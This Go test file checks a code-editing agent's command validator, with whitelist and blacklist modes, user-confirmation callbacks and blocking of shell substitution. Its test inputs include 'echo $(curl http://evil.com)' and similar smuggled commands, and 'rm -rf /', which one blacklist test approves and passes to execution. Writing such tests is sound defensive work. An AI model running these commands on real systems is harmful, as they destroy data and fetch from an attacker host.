package tool

import (
	"code-editing-agent/internal/domain/safety"
	"code-editing-agent/internal/infrastructure/adapter/file"
	"context"
	"regexp"
	"strings"
	"testing"
)

func TestWhitelistMode_AllowsWhitelistedCommands(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

	// Set a callback that tracks whether it was called
	callbackCalled := false
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		callbackCalled = true
		return true
	})

	// Execute a whitelisted command (ls)
	input := `{"command": "ls", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)
	if err != nil {
		t.Fatalf("whitelisted command should execute: %v", err)
	}

	// Callback should NOT be called for whitelisted commands
	if callbackCalled {
		t.Error("callback should not be called for whitelisted commands")
	}
}

func TestWhitelistMode_BlocksNonWhitelistedCommands(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode with askLLMOnUnknown=false (strict mode)
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

	// Execute a non-whitelisted command (curl)
	input := `{"command": "curl http://example.com", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)
	if err == nil {
		t.Fatal("non-whitelisted command should be blocked")
	}

	if !strings.Contains(err.Error(), "whitelist") || !strings.Contains(err.Error(), "command blocked") {
		t.Errorf("error should mention whitelist and command blocked, got: %v", err)
	}
}

func TestWhitelistMode_AskLLMOnUnknownTriggersCallback(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode with askLLMOnUnknown=true
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, true)

	// Set a callback that approves the command
	callbackCalled := false
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, reason, _ string) bool {
		callbackCalled = true
		// Verify the reason mentions not being on whitelist
		if !strings.Contains(reason, "whitelist") && reason != "" {
			t.Errorf("reason should mention whitelist, got: %s", reason)
		}
		return true // approve
	})

	// Execute a non-whitelisted command (curl)
	input := `{"command": "curl http://example.com", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)

	// Callback should be called for non-whitelisted commands when askLLMOnUnknown=true
	if !callbackCalled {
		t.Error("callback should be called for non-whitelisted commands when askLLMOnUnknown=true")
	}

	// Command should succeed since callback approved it
	if err != nil {
		t.Errorf("command should succeed when callback approves: %v", err)
	}
}

func TestWhitelistMode_CallbackDenialBlocksCommand(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode with askLLMOnUnknown=true
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, true)

	// Set a callback that denies the command
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		return false // deny
	})

	// Execute a non-whitelisted command
	input := `{"command": "curl http://example.com", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)

	if err == nil {
		t.Fatal("command should be blocked when callback denies")
	}

	if !strings.Contains(err.Error(), "whitelist") || !strings.Contains(err.Error(), "user denied") {
		t.Errorf("error should mention whitelist and user denied: %v", err)
	}
}

func TestWhitelistMode_PipedCommandsAllowed(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

	callbackCalled := false
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		callbackCalled = true
		return true
	})

	// Execute a piped command where all parts are whitelisted
	input := `{"command": "ls -la | grep foo", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)
	if err != nil {
		t.Fatalf("piped whitelisted commands should execute: %v", err)
	}

	if callbackCalled {
		t.Error("callback should not be called for whitelisted piped commands")
	}
}

func TestWhitelistMode_PipedCommandsBlockedIfAnyPartNotWhitelisted(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode with askLLMOnUnknown=false
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

	// Execute a piped command where one part is not whitelisted
	input := `{"command": "ls -la | rm file.txt", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)

	if err == nil {
		t.Fatal("piped command with non-whitelisted part should be blocked")
	}

	if !strings.Contains(err.Error(), "whitelist") || !strings.Contains(err.Error(), "command blocked") {
		t.Errorf("error should mention whitelist and command blocked: %v", err)
	}
}

func TestWhitelistMode_CustomPatternsWork(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Create whitelist with custom patterns
	customPatterns := []safety.WhitelistPattern{
		{Pattern: regexp.MustCompile(`^mycustomcmd(\s|$)`), Description: "custom command"},
	}
	patterns := append(safety.DefaultWhitelistPatterns(), customPatterns...)
	whitelist := safety.NewCommandWhitelist(patterns)
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

	callbackCalled := false
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		callbackCalled = true
		return true
	})

	// This would fail since mycustomcmd doesn't exist, but we can check that
	// the whitelist check passes by verifying the callback wasn't called
	// We just need to check that we get past the whitelist check
	input := `{"command": "mycustomcmd arg1 arg2", "dangerous": false}`
	_, _ = adapter.ExecuteTool(context.Background(), "bash", input)

	// Callback should not be called because the command is whitelisted
	if callbackCalled {
		t.Error("callback should not be called for custom whitelisted command")
	}
}

func TestBlacklistMode_StillWorks(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Explicitly set blacklist mode (default)
	adapter.SetValidationMode(safety.ModeBlacklist, nil, false)

	callbackCalled := false
	var receivedDangerous bool
	adapter.SetCommandConfirmationCallback(func(_ string, isDangerous bool, _, _ string) bool {
		callbackCalled = true
		receivedDangerous = isDangerous
		return true
	})

	// Execute a dangerous command
	input := `{"command": "rm -rf /", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)

	// Callback should be called
	if !callbackCalled {
		t.Error("callback should be called in blacklist mode")
	}

	// Command should be marked as dangerous
	if !receivedDangerous {
		t.Error("rm -rf / should be marked as dangerous")
	}

	// Command should succeed (callback approved)
	if err != nil {
		t.Errorf("command should succeed when callback approves: %v", err)
	}
}

func TestValidationMode_DefaultsToBlacklist(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Don't set any validation mode - should default to blacklist behavior

	callbackCalled := false
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		callbackCalled = true
		return true
	})

	// Execute a safe command
	input := `{"command": "echo hello", "dangerous": false}`
	_, err := adapter.ExecuteTool(context.Background(), "bash", input)
	if err != nil {
		t.Fatalf("safe command should execute: %v", err)
	}

	// In blacklist mode with callback set, callback is always called
	if !callbackCalled {
		t.Error("callback should be called in default blacklist mode")
	}
}

// TestWhitelistMode_ConcurrentAccess verifies thread-safety of validation mode reads/writes.
// Run with: go test -race ./internal/infrastructure/adapter/tool/... -run TestWhitelistMode_ConcurrentAccess.
func TestWhitelistMode_ConcurrentAccess(t *testing.T) {
	t.Parallel() // Allow parallel execution with other tests

	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Create a whitelist
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())

	// Set a callback that always approves
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		return true
	})

	// Number of concurrent goroutines
	const numGoroutines = 50
	const numIterations = 100

	done := make(chan struct{})

	// Goroutines that toggle validation mode
	for range numGoroutines / 2 {
		go func() {
			defer func() { done <- struct{}{} }()
			for j := range numIterations {
				if j%2 == 0 {
					adapter.SetValidationMode(safety.ModeWhitelist, whitelist, true)
				} else {
					adapter.SetValidationMode(safety.ModeBlacklist, nil, false)
				}
			}
		}()
	}

	// Goroutines that execute commands (triggering validation reads)
	for range numGoroutines / 2 {
		go func() {
			defer func() { done <- struct{}{} }()
			for range numIterations {
				// Use a whitelisted command to avoid actual execution issues
				input := `{"command": "ls", "dangerous": false}`
				// Ignore errors - we're testing for race conditions, not correctness
				_, _ = adapter.ExecuteTool(context.Background(), "bash", input)
			}
		}()
	}

	// Wait for all goroutines to complete
	for range numGoroutines {
		<-done
	}

	// If we get here without the race detector complaining, the test passes
}

// TestCallbackSetters_ConcurrentAccess verifies thread-safety of callback setter/getter operations.
// Run with: go test -race ./internal/infrastructure/adapter/tool/... -run TestCallbackSetters_ConcurrentAccess.
func TestCallbackSetters_ConcurrentAccess(t *testing.T) {
	t.Parallel()

	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Configure whitelist mode to exercise both callback paths
	whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, true)

	const numIterations = 20
	const numPerGroup = 4

	done := make(chan struct{}, numPerGroup*3)

	// Launch goroutines that toggle callbacks and execute commands
	launchConfirmCallbackTogglers(adapter, numPerGroup, numIterations, done)
	launchDangerousCallbackTogglers(adapter, numPerGroup, numIterations, done)
	launchCommandExecutors(adapter, numPerGroup, numIterations, done)

	// Wait for all goroutines
	for range numPerGroup * 3 {
		<-done
	}
}

func launchConfirmCallbackTogglers(adapter *ExecutorAdapter, count, iterations int, done chan struct{}) {
	for range count {
		go func() {
			defer func() { done <- struct{}{} }()
			for j := range iterations {
				if j%2 == 0 {
					adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool { return true })
				} else {
					adapter.SetCommandConfirmationCallback(nil)
				}
			}
		}()
	}
}

func launchDangerousCallbackTogglers(adapter *ExecutorAdapter, count, iterations int, done chan struct{}) {
	for range count {
		go func() {
			defer func() { done <- struct{}{} }()
			for j := range iterations {
				if j%2 == 0 {
					adapter.SetDangerousCommandCallback(func(_, _ string) bool { return true })
				} else {
					adapter.SetDangerousCommandCallback(nil)
				}
			}
		}()
	}
}

func launchCommandExecutors(adapter *ExecutorAdapter, count, iterations int, done chan struct{}) {
	for range count {
		go func() {
			defer func() { done <- struct{}{} }()
			for range iterations {
				input := `{"command": "ls", "dangerous": false}`
				_, _ = adapter.ExecuteTool(context.Background(), "bash", input)
			}
		}()
	}
}

// TestWhitelistMode_SubstitutionBlocking verifies that commands with non-whitelisted
// substitutions are blocked, even if the outer command is whitelisted.
func TestWhitelistMode_SubstitutionBlocking(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "echo with non-whitelisted $() substitution",
			command: "echo $(curl http://evil.com)",
			wantErr: true,
		},
		{
			name:    "echo with non-whitelisted backtick substitution",
			command: "echo `curl http://evil.com`",
			wantErr: true,
		},
		{
			name:    "nested non-whitelisted substitution",
			command: "echo $(echo $(curl http://evil.com))",
			wantErr: true,
		},
		{
			name:    "whitelisted command inside substitution",
			command: "echo $(ls -la)",
			wantErr: false,
		},
		{
			name:    "multiple substitutions with one non-whitelisted",
			command: "echo $(ls) $(curl http://evil.com)",
			wantErr: true,
		},
		{
			name:    "deeply nested non-whitelisted command",
			command: "echo $(echo $(echo $(rm -rf /)))",
			wantErr: true,
		},
		{
			name:    "whitelisted backtick substitution",
			command: "echo `pwd`",
			wantErr: false,
		},
		{
			name:    "mixed substitution styles with non-whitelisted",
			command: "echo $(echo `curl evil.com`)",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			fileManager := file.NewLocalFileManager(".")
			adapter := NewExecutorAdapter(fileManager)

			whitelist := safety.NewCommandWhitelist(safety.DefaultWhitelistPatterns())
			adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

			input := `{"command": "` + tt.command + `", "dangerous": false}`
			_, err := adapter.ExecuteTool(context.Background(), "bash", input)

			if tt.wantErr {
				if err == nil {
					t.Fatalf("command %q should be blocked", tt.command)
				}
				if !strings.Contains(err.Error(), "whitelist") || !strings.Contains(err.Error(), "command blocked") {
					t.Errorf("error should mention whitelist and command blocked, got: %v", err)
				}
			} else {
				if err != nil {
					t.Errorf("command %q should be allowed: %v", tt.command, err)
				}
			}
		})
	}
}

// TestWhitelistMode_DangerousButWhitelisted verifies behavior when a command is both
// whitelisted and matches dangerous patterns. This tests precedence of whitelist over blacklist.
func TestWhitelistMode_DangerousButWhitelisted(t *testing.T) {
	fileManager := file.NewLocalFileManager(".")
	adapter := NewExecutorAdapter(fileManager)

	// Create a custom whitelist that includes a normally-dangerous command
	// Note: This is intentionally testing an unusual configuration
	customPatterns := []safety.WhitelistPattern{
		{Pattern: regexp.MustCompile(`^rm(\s|$)`), Description: "rm command (for testing)"},
	}
	patterns := append(safety.DefaultWhitelistPatterns(), customPatterns...)
	whitelist := safety.NewCommandWhitelist(patterns)
	adapter.SetValidationMode(safety.ModeWhitelist, whitelist, false)

	callbackCalled := false
	adapter.SetCommandConfirmationCallback(func(_ string, _ bool, _, _ string) bool {
		callbackCalled = true
		return true
	})

	// In whitelist mode, if the command is whitelisted, it should execute
	// without triggering the callback (whitelist takes precedence)
	input := `{"command": "rm test.txt", "dangerous": false}`
	_, _ = adapter.ExecuteTool(context.Background(), "bash", input)

	// The callback should NOT be called because in whitelist mode,
	// whitelisted commands bypass dangerous command checks
	if callbackCalled {
		t.Error("in whitelist mode, whitelisted commands should bypass dangerous checks")
	}
}
